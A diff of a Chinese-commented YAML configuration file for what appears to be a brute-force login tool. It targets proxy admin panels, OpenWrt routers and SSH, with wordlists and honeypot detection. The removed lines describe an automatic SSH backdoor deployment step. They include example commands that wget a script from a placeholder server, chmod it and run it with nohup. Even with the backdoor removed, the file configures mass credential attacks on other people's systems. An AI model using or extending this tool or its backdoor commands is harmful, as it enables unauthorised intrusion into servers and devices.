@@ -13,7 +13,7 @@
 #  3 = HUI面板       POST /hui/auth/login
 #  4 = 咸蛋面板      POST /login
 #  5 = SUI面板       POST /app/api/login
-#  6 = SSH爆破       SSH 直连 + 蜜罐检测 + 可选后门
+#  6 = SSH爆破       SSH 直连 + 蜜罐检测
 #  7 = Sub Store     GET 路径探测
 #  8 = OpenWrt       POST /cgi-bin/luci/
 #  设为 0 或不设则启动后交互式选择
@@ -71,7 +71,7 @@ XUI_SLEEP_SECONDS: 2
 #    模式 1,2,4,5 → admin
 #    模式 3       → sysadmin
 #    模式 6,8     → root
-#    模式 7       → 2cXaAxRGfddmGz2yx1wA
+#    模式 7       → (内置默认)
 #  环境变量: XUI_USERNAME_FILE
 # ---------------------------------------------------------------------------
 # XUI_USERNAME_FILE: "usernames.txt"
@@ -82,29 +82,6 @@ XUI_SLEEP_SECONDS: 2
 #  环境变量: XUI_PASSWORD_FILE
 # ---------------------------------------------------------------------------
 # XUI_PASSWORD_FILE: "passwords.txt"
-
-# ---------------------------------------------------------------------------
-#  SSH 爆破成功后是否自动部署后门（仅模式 6 有效）
-#  true / false
-#  部署流程:
-#    1. SSH 登录成功
-#    2. 蜜罐检测（假密码重试 + 数学运算验证）
-#    3. 自动安装 unzip/wget/curl（如缺失）
-#    4. 逐条执行后门命令文件中的命令
-#    5. 成功写入 hmsuccess.txt，失败写入 hmfail.txt
-#  环境变量: XUI_BACKDOOR
-# ---------------------------------------------------------------------------
-XUI_BACKDOOR: false
-
-# ---------------------------------------------------------------------------
-#  后门命令文件路径，每行一条 shell 命令（仅模式 6 有效）
-#  示例内容:
-#    wget http://your-server.com/bd.sh -O /tmp/bd.sh
-#    chmod +x /tmp/bd.sh
-#    nohup /tmp/bd.sh > /dev/null 2>&1 &
-#  环境变量: XUI_BACKDOOR_CMD_FILE
-# ---------------------------------------------------------------------------
-XUI_BACKDOOR_CMD_FILE: "后门命令.txt"
 
 # ---------------------------------------------------------------------------
 #  是否跳过 Excel 生成（IP 地理信息查询）
